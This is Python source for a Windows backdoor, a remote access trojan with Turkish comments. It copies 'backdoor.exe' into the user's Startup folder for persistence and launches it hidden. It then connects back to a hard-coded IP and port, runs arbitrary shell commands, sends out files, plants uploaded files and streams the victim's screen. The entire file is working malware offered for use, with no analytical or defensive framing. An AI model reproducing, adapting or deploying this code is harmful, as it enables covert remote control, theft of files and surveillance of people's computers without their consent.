import socket
import subprocess
import simplejson
import os
import base64
from vidstream import ScreenShareClient
import time
import os
import shutil
import ctypes
import winreg
import sys


def copy_to_startup():
		try:
			# Başlangıç klasörünü belirle
			startup_folder = os.path.join(os.environ['APPDATA'], 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')

			# Kopyalanacak dosyanın adını ve kaynak yolunu belirle
			source_filename = 'backdoor.exe'
			source_path = os.path.abspath(source_filename)

			# Hedef yol oluştur
			destination = os.path.join(startup_folder, source_filename)

			# Dosyayı başlangıç klasörüne kopyala
			shutil.copyfile(source_path, destination)

			# Dosyayı çalıştır
			subprocess.Popen(destination, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=subprocess.CREATE_NO_WINDOW)

			print(f"{source_filename} başarıyla başlangıç klasörüne kopyalandı ve çalıştırıldı.")

		except Exception as e:
			print(f"Hata oluştu: {str(e)}")


ip = '192.168.100.133'
port = 8080
class MySocket:
	global ip
	global port

	def __init__(self, ip, port):
		try:
			self.my_connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
			self.my_connection.connect((ip,port))
		except ConnectionResetError or ConnectionRefusedError:
			time.sleep(5)
			self.my_connection.connect((ip,port))
	def command_execution(self, command):
		return subprocess.check_output(command, shell=True)

	def json_send(self, data):
		json_data = simplejson.dumps(data)
		self.my_connection.send(json_data.encode("utf-8"))

	def json_receive(self):
		json_data = ""
		while True:
			try:
				json_data = json_data + self.my_connection.recv(1024).decode()
				return simplejson.loads(json_data)
			except ValueError:
				continue

	def execute_cd_command(self,directory):
		os.chdir(directory)
		return "Cd to " + directory

	def get_file_contents(self,path):
		with open(path,"rb") as my_file:
			return base64.b64encode(my_file.read())
		
	
	
	def screenshare(self):
		victim = ScreenShareClient(ip, port=9999)
		victim.start_stream()

	def save_file(self,path,content):
		with open(path,"wb") as my_file:
			my_file.write(base64.b64decode(content))
			return "Download OK"

	def start_socket(self):
		while True:
			command = self.json_receive()
			try:
				if command[0] == "quit":
					self.my_connection.close()
					exit()
				elif command[0] == "cd" and len(command) > 1:
					command_output = self.execute_cd_command(command[1])
				elif command[0] == "download":
					command_output = self.get_file_contents(command[1])
				elif command[0] == "upload":
					command_output = self.save_file(command[1],command[2])
				elif command[0] == 'screen':
					self.screenshare()
				else:
					command_output = self.command_execution(command)
			except Exception:
				command_output = "Error!"
			self.json_send(command_output)
		self.my_connection.close()

copy_to_startup()
my_socket_object = MySocket(ip,port)
my_socket_object.start_socket()
